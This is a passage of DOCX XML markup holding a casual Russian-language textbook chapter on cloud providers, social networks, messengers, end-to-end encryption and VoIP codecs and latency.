        <w:t>SaaS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Провайдер даёт всё, ты просто пользуешься | Gmail |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Топ облачных провайдеров (2025)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Провайдер | Доля рынка | Особенности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----------|-----------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AWS (Amazon Web Services)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~32% | Самый большой, есть ВСЁ (300+ сервисов) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Microsoft Azure</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~23% | Интеграция с Windows, Office, Active Directory |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Google Cloud</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~11% | Сильный в ML/AI (TensorFlow, BigQuery) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Alibaba Cloud</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~4% | Популярен в Китае |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Яндекс.Облако</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~1% | Быстрый для России, дешевле AWS |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Netflix работает на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AWS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (99.9% своей инфраструктуры). Amazon, блять, зарабатывает на Netflix больше, чем Netflix на подписчиках. 😂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.5.5. Социальные сети: где все залипают</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Социальная сеть (social network)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — платформа для общения, публикации контента и взаимодействия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Топ соцсетей (2025)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Соцсеть | Пользователей (активных в месяц) | Страна | Аудитория |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------|----------------------------------|--------|-----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Facebook</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~3 млрд | США | Старая гвардия (30+), бумеры |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>YouTube</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~2.5 млрд | США | Видео для всех возрастов |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WhatsApp</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~2.5 млрд | США (Meta) | Мессенджер (но тут в списке соцсетей) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Instagram</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~2 млрд | США (Meta) | Фото, сторис, рилс (молодёжь) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TikTok</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~1.6 млрд | Китай | Короткие видео (зумеры, Gen Alpha) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WeChat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~1.3 млрд | Китай | Всё в одном (мессенджер + соцсеть + платежи) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>VK (ВКонтакте)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~100 млн | Россия | Популярен в России, СНГ |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Twitter (X)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~500 млн | США | Новости, мемы, Илон Маск |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TikTok</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — самое скачиваемое приложение 2020-2024 (особенно среди 13-24 лет). Алгоритм ленты настолько хорош, что люди залипают на часы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Как работают социальные сети</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принципы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Профиль** — страница пользователя (фото, имя, инфа о себе)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Посты** (публикации) — текст, фото, видео</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Лайки** (reactions) — реакция на контент</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Комментарии** — обсуждение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Подписки** (follow) — слежка за другими пользователями</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Лента** (feed) — поток постов от друзей и подписок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм ленты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — соцсети не показывают посты в хронологическом порядке. Вместо этого используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>алгоритм ранжирования</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Facebook/Instagram**: показывает посты, которые с большей вероятностью залайкаешь/откомментишь</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TikTok**: подбирает видео на основе времени просмотра (если досмотрел до конца → покажет похожие)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**YouTube**: рекомендации на основе истории просмотров + кликбейт-миниатюры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: алгоритмы оптимизированы под </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>время в приложении</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, а не под твоё счастье. В итоге — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>бесконечная прокрутка (doom scrolling)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Монетизация соцсетей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Откуда соцсети берут бабло?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Реклама** (95% дохода Facebook, Instagram, TikTok)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Таргетированная реклама (на основе твоих интересов, возраста, местоположения)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фейсбук знает о тебе **больше, чем твоя мама**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Подписки**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>YouTube Premium (без рекламы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Twitter Blue (галочка верификации за $8/мес)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Продажа данных** (официально "для партнёров")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Соцсети продают обезличенные данные маркетологам</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Известная фраза</w:t>
      </w:r>
      <w:r>
        <w:t>: "Если продукт бесплатный — продукт это ты." Твоё внимание и данные — это товар.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.5.6. Мессенджеры: пишем, а не звоним</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мессенджер (instant messenger)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — приложение для обмена текстовыми сообщениями в реальном времени.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Топ мессенджеров (2025)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Мессенджер | Пользователей | Страна | Особенности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------|---------------|--------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WhatsApp</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~2.5 млрд | США (Meta) | Самый популярный (особенно в Европе, Индии) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Telegram</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~900 млн | Россия/ОАЭ | Каналы, боты, стикеры, без рекламы (пока) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WeChat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~1.3 млрд | Китай | Всё в одном (мессенджер + платежи + мини-апп) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Viber</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~260 млн | Израиль | Популярен в странах СНГ, Восточной Европе |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Signal</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~40 млн | США | Максимальная приватность, open-source |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>iMessage</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~1 млрд | США (Apple) | Только для iPhone, iPad, Mac |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Discord</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~600 млн | США | Для геймеров, голосовые каналы, сообщества |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>End-to-End шифрование (E2E)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>End-to-End Encryption (E2EE)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — шифрование "от конца до конца". Сообщения шифруются на твоём устройстве и расшифровываются только на устройстве получателя. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Даже сервер не может их прочитать</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кто использует E2E</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**WhatsApp** (протокол Signal)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Signal** (E2E по умолчанию, самый безопасный)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Telegram** (только в "секретных чатах", обычные чаты — НЕ E2E!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**iMessage** (E2E для переписок между iPhone)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кто НЕ использует E2E</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**VK** (сообщения хранятся на серверах в открытом виде)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Discord** (нет E2E, администрация может читать сообщения)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Золотое правило</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Если обсуждаешь что-то секретное — используй </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Signal</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WhatsApp</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Telegram: король русскоязычного интернета</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности Telegram</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Каналы** (broadcast) — односторонняя публикация (как блог)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Боты** — автоматизация (бот для заказа пиццы, новостей, напоминаний)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стикеры** (больше 10,000 паков)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Группы до 200,000 человек**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Файлы до 2 ГБ** (можно заливать фильмы, игры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: обычные чаты </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не зашифрованы end-to-end</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (только "секретные чаты"). Павел Дуров может технически читать сообщения (хотя клянётся, что не читает).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факт</w:t>
      </w:r>
      <w:r>
        <w:t>: Telegram стал убежищем для пиратов, хакеров, криптотрейдеров и прочей маргинальной публики. За это его любят. 🏴‍☠️</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.5.7. VoIP (голосовые звонки через интернет)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>VoIP (Voice over IP)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — технология передачи голоса через интернет (вместо телефонной сети).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Популярные VoIP-сервисы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Сервис | Пользователей | Особенности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------|---------------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Zoom</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~300 млн | Видеоконференции (стал мемом во время COVID) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Microsoft Teams</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~270 млн | Корпоративный (интеграция с Office 365) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Skype</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~40 млн (пик был ~300 млн в 2015) | Первый популярный VoIP (2003), умирает |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Discord</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~600 млн | Для геймеров (голосовые каналы) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Google Meet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~100 млн | Видеоконференции (интеграция с Gmail) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Как работает VoIP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Голос → Аналоговый сигнал** (микрофон)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аналоговый → Цифровой** (ADC, дискретизация)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сжатие** (кодеки: Opus, G.711, G.729)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Упаковка в UDP-пакеты** (почему UDP? нужна низкая задержка, потеря 1-2% пакетов допустима)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Передача через интернет**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Распаковка + декомпрессия** (на приёмной стороне)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Цифровой → Аналоговый** (DAC, динамик)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кодеки</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Кодек | Битрейт | Качество | Задержка |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------|---------|----------|----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>G.711</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 64 Кбит/с | Отличное (как телефон) | 0.75 мс |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>G.729</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 8 Кбит/с | Хорошее (сжатие 8:1) | 10 мс |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Opus</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 6-510 Кбит/с | От телефона до Hi-Fi | 5-66.5 мс |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Современный стандарт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Opus</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (используется в Discord, WhatsApp, Telegram).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Задержка (Latency) — главный враг VoIP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Если задержка (latency) &gt; 150 мс, разговор превращается в ад ("Алло? Ты меня слышишь? Повтори ещё раз!").</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Приемлемые значения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**&lt; 150 мс** — отлично (не замечаешь)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
